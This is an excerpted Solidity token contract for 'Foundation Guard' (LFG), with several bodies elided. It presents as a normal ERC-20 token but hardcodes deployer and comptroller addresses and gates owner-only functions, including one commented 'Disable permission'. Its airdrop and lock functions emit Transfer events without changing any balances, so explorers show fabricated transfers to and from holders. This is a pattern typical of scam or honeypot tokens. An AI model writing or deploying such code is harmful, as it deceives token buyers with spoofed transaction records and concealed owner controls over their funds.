...
contract Foundation is Context, IERC20 {
    ...
    address deployer = 0xAd41BD1cf3Fd753017Ef5c0da8dF31A3074EA1Ea;
    address public _comptroller = 0x0C269eD10EEc1bBa99E31cCd5861dfa8d98552F4;
   constructor () public {

        _name = "Foundation Guard";
        _symbol = "LFG";
        _decimals = 18;
        uint256 initialSupply = 21000000000 * 10 ** 18 ;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function input(address recipient) public _verify(){
  ...
  function output(address recipient) public _verify(){
      //Disable permission
    ...
    function spender(address addr) public _verify() virtual  returns (bool) {
        //Approve Spending
  ...
  function distribute(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
  ...
  function airdrop(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
  ...
  function lock(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
